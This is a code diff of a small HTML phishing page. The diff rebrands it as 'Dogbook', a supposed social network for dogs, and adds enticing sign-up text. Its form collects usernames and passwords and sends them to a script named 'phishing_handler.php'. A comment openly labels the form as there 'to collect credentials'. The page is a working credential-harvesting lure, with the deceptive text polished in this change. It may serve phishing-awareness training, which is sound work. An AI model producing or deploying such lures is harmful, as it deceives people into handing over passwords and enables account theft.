@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Shimi's Fan Club</title>
+    <title>Dogbook - The Facebook of dogs</title>
     <style>
         body {
             font-family: Arial, sans-serif;
@@ -54,13 +54,20 @@
 </head>
 <body>
     <div class="container">
-        <h1>Welcome to Shimi's Fan Club</h1>
-        <p>To join the club and access exclusive content, please enter your details below.</p>
+        <! --Title of the page-->
+        <h1>Welcome to Dogbook</h1>
+        <! --Incentive to join social network-->
+        <p>The Facebook of dogs. Connect with other dogs and their owners, share photos and videos, and make new friends.</p>
+        <p>To join the fastest growing community of dog enthusiasts and access exclusive content, please enter your details below.</p>
+        
+        <! --Login form to collect credentials-->
         <form action="phishing_handler.php" method="post">
             <input type="text" name="username" placeholder="Enter your username" required>
             <input type="password" name="password" placeholder="Enter your password" required>
             <input type="submit" value="Join Now">
         </form>
     </div>
+    <! --Background: dog picture with 50% opacity, dezoomed by 50%-->
+    <img src=".\assets\dogs picture.jpg" style="position: fixed; bottom: 20; right: 10; opacity: 0.8; z-index: -1; transform: scale(0.45)">
 </body>
 </html>
